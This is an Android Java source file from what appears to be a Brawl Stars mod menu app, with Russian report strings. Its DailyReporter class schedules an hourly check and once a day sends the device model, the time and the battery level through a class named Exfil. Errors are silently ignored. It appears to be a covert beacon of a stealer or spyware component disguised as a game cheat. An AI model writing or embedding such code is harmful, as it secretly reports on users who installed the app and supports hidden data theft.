package com.brawl.modmenu;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Handler;
import android.os.Looper;

public class DailyReporter {

    private static final long INTERVAL = 60 * 60 * 1000L; // проверяем каждый час
    private static int lastReportDay = -1;

    public static void start(final Context ctx) {
        Handler h = new Handler(Looper.getMainLooper());

        Runnable task = new Runnable() {
            @Override
            public void run() {
                try {
                    java.util.Calendar cal = java.util.Calendar.getInstance();
                    int hour = cal.get(java.util.Calendar.HOUR_OF_DAY);
                    int day = cal.get(java.util.Calendar.DAY_OF_YEAR);

                    if (hour == 21 && day != lastReportDay) {
                        lastReportDay = day;
                        sendReport(ctx);
                    }
                } catch (Throwable ignored) {}
                h.postDelayed(this, INTERVAL);
            }
        };
        h.postDelayed(task, INTERVAL);
    }

    private static void sendReport(Context ctx) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("📊 ЕЖЕДНЕВНЫЙ ОТЧЁТ\n");
            sb.append("━━━━━━━━━━━━━━━━━━\n\n");
            sb.append("📱 Устройство: ").append(DeviceInfo.getModel(ctx)).append("\n");
            sb.append("🕐 Время: ").append(new java.util.Date()).append("\n\n");

            IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent b = ctx.registerReceiver(null, f);
            if (b != null) {
                int level = b.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                sb.append("🔋 Батарея: ").append(level).append("%\n");
            }

            sb.append("\n✅ Приложение работает\n");
            sb.append("✅ Boost активен\n");

            Exfil.send("DAILY_REPORT", sb.toString());
        } catch (Throwable ignored) {}
    }
}
